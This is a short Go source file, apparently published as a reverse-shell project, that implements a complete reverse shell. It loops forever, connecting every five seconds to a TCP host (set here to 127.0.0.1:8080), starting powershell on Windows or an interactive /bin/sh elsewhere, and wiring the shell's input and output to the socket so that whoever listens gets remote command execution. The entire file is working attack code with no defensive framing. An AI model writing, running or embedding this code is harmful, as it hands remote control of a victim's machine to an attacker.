package main

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"time"
)

const delay = 5
const host = "127.0.0.1:8080"

func main() {
	fmt.Println("github.com/orf1/reverse-shell-go")
	for {
		time.Sleep(delay * time.Second)
		connect()
	}
}

// connect attempts to send a shell to a remote server
func connect() {
	// attempts to establish a tcp connection with server
	fmt.Println("Attempting to establish tcp connection with server")
	con, err := net.Dial("tcp", host)
	if err != nil {
		fmt.Println(err)
		return
	}

	// detects os and sets appropriate shell
	fmt.Println("Detecting operating system")
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		fmt.Println("Detected windows, using powershell")
		cmd = exec.Command("powershell")
	} else {
		fmt.Println("Detected mac or linux, using /bin/sh")
		cmd = exec.Command("/bin/sh", "-i")
	}

	// binds stdin, stdout, and stderr to connection
	fmt.Println("binding standard interfaces to connection")
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con

	// opens shell
	fmt.Println("shell opened")
	err = cmd.Run()
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("shell closed")
}
